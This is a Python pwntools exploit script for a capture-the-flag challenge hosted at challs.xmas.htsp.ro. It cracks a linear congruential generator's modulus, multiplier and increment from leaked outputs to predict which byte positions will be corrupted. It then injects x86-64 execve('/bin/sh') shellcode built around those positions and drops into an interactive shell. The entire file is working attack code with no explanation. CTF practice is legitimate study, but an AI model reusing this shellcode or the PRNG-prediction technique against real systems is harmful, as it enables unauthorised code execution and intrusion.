#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from functools import reduce
from Crypto.Util.number import *

def crackC(states,n,m):
  c = (states[1]-states[0]*m)%n
  return n,m,c

def crackM(states,n):
  m = (states[2]-states[1])*inverse(states[1]-states[0],n)%n
  return crackC(states,n,m)

def crackN(states):
  diffs = [s1-s0 for s0, s1 in zip(states, states[1:])]
  zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
  n = abs(reduce(GCD, zeroes))
  return crackM(states,n)

def getNextStates(state):
	next_states = []
	for i in range(14):
		next_states.append(int((state*m+c)%n))
		state = next_states[i]
	return next_states, state

e = ELF("./chall")
context.binary = e

if "--remote" in sys.argv:
	r = remote("challs.xmas.htsp.ro",12010)
else:
	r = process([e.path])

r.sendlineafter('?\n','A'*45)
r.recvline()
data = r.recvline()
data = data[data.find(b':')+2:-2]
data = data.split(b' ')
data = [int(i) for i in data]
n,m,c = crackN(data)
state = data[-1]
next_states, state = getNextStates(state)

bad_idxs = [i % 0x2d for i in next_states]
bad_idxs.sort()

res = []
[res.append(x) for x in bad_idxs if x not in res] 
r.sendlineafter('? (y/n)\n','n')

pay = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

for i in res:
  if len(pay) <= i:
    continue
  pay = pay[:i] + "A" + pay[i:]


r.sendlineafter('?\n', pay.ljust(0x2d, asm("nop")))
r.sendlineafter("(y/n)", "y")
r.interactive()
